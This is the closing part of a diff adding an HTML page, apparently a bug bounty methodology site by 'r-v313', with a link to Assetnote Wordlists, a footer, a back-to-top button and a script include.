+            <li><a href="https://wordlists.assetnote.io/" target="_blank" rel="noopener noreferrer">Assetnote Wordlists</a></li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+  </div><!-- /#content -->
+
+  <footer>
+    <span>RV_U Methodology</span> — Created by <span>r-v313</span> |
+    64 Sections of Professional Bug Bounty Techniques |
+    <span>Happy Hunting! 🎯</span>
+  </footer>
+
+</div><!-- /#main-content -->
+
+<!-- Back to Top -->
+<button id="back-to-top" title="Back to top">↑</button>
+
+<!-- Toast Notification -->
+<div id="toast"></div>
+
+<script src="js/app.js"></script>
+</body>
+</html>
